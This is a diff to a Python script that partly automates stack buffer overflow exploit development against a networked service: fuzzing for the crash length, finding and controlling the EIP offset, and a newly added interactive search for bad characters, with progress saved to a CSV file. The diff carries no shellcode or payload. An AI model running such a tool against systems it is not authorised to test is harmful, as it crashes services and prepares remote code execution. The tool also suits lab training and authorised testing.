@@ -5,8 +5,9 @@ dataDict = dict()
 changeData = False
 fuzzingSkip = False
 findEIPSkip = False
-
-if os.path.exists("save-buffer-overflow.csv"):
+findBadcharsSkip = False
+if os.path.exists("save-buffer-overflow.csv") and query_yes_no(CGREEN + "A backup has been found, do you want to restore it?" + CEND):
+    goodValue = True
     with open("save-buffer-overflow.csv", "r+") as file:
         data = csv.reader(file)
         dataDict = dict(data)
@@ -22,9 +23,18 @@ if os.path.exists("save-buffer-overflow.csv"):
                     fuzzingSkip = query_yes_no("The target crash at "+ CBLUE2 + value + CEND +" bytes. Do you want skip fuzzing?")
                 if key == "offset":
                     findEIPSkip = query_yes_no("The offset is "+ CBLUE2 + value + CEND +" bytes. Do you want to skip the offset search?")
+                if key == "badchars":
+                    findBadcharsSkip = query_yes_no("We have found this badchars : "+ CBLUE2 + value + CEND +". Do you want to skip the badchars detection?")
+                    if query_yes_no(CGREEN +"Do you want to enter custom bad characters?"+ CEND, "no"):
+                        hex_pattern = re.compile(r"^\\x([0-9A-Fa-f]{2})+$")
+                        customBadchars = raw_input("Enter all custom bad characters in hexadecimal using this format '\\x00\\x01' :")
+                        # Check if the data is in hexadecimal format and contains hexadecimal.
+                        while not hex_pattern.match(customBadchars):
+                            customBadchars = raw_input(CRED + "[!] Error: the format of the bad characters is incorrect. Please enter valid ones : " + CEND)
             else:
                 goodValue = query_yes_no(aff + " is : "+ CBLUE2 + value + CEND +", do you want to keep it?", default="yes")
             if not goodValue:
+                goodValue = True
                 changeData = True
                 changeValue = str(raw_input("Please enter the new {} : ".format(aff2)))
                 if key == "port":
@@ -38,11 +48,12 @@ else:
     dataDict['page'] = str(raw_input("Page : "))
 
 if changeData:
-    with open("save-buffer-overflow.csv", "w") as file:
-        writer = csv.writer(file)
-        for key, value in dataDict.items():
-            writer.writerow([key, value])
-        file.close()
+    changeBackup(dataDict)
+    #with open("save-buffer-overflow.csv", "w") as file:
+    #    writer = csv.writer(file)
+    #    for key, value in dataDict.items():
+    #        writer.writerow([key, value])
+    #    file.close()
 sizeFuzzing = 100
 badchars = (
 "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
@@ -81,7 +92,7 @@ if not fuzzingSkip:
             file.close()
 
 if not findEIPSkip:           
-    if query_yes_no(CYELLOW + "Do not forget to restart the service, if it has crashed"+ CEND +". Do you want start the second step to find EIP?"):
+    if query_yes_no(CYELLOW + "Do not forget to restart the service, if it has crashed."+ CEND +"\nDo you want start the second step to find EIP?"):
         offset = findEIP(buffer, dataDict["lenCrash"], dataDict['host'], int(dataDict['port']))
         if offset != 0:
             dataDict['offset'] = offset
@@ -90,7 +101,23 @@ if not findEIPSkip:
                 writer.writerow(["offset", dataDict['offset']])
                 file.close()
                 
-    if query_yes_no("Do you want control EIP offset?"):
+    if query_yes_no(CYELLOW + "Do not forget to restart the service, if it has crashed."+ CEND +"\nDo you want control EIP offset?"):
         eipGood = controlEIP(buffer, int(dataDict["offset"]), int(dataDict["lenCrash"]), dataDict['host'], int(dataDict['port']))
         if not eipGood:
-            query_yes_no("Do you want")
+            query_yes_no("Do you want restart the programm?")
+                  
+if not findBadcharsSkip:
+    dataDict['badchars'] = "\\x00"
+    if query_yes_no(CYELLOW + "Do not forget to restart the service, if it has crashed."+ CEND +"\nDo you want search badchars?"):
+        while searchBadchars(buffer, int(dataDict["offset"]), badchars, dataDict['host'], int(dataDict['port'])):
+            oneBadchar = raw_input("Enter the bad character in hexadecimal form as 2 characters : ")
+            # Check if the data is in hexadecimal format and contains only 2 characters in length.
+            while not re.match(r'^[0-9a-fA-F]{2}$', oneBadchar):
+                oneBadchar = raw_input(CRED + "[!] Error: the format of the bad character is incorrect. Please enter a valid one : " + CEND)
+            dataDict['badchars'] += "\\x"+ oneBadchar
+            changeBackup(dataDict)
+            if not query_yes_no(CYELLOW +"[!] WARNING : Do not forget to restart the service to find other badchars.\n"+ CEND + "Do you want continue to search other badchars?"):
+                break
+            else:
+                badchars = badchars.replace("\\x"+ oneBadchar, "")
+                repr(badchars)
